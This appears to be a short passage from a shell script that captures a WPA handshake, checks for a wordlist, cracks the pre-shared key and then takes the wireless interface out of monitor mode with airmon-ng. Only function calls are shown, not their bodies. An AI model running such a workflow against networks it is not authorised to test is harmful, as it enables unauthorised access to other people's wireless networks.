listen_for_wpa_handshake

# Check for the wordlist
check_for_wordlist

# Crack the handshake
crack_psk_and_process_output

# Switch interface out of monitor mode
airmon-ng stop $MON_INTERFACE &> /dev/null
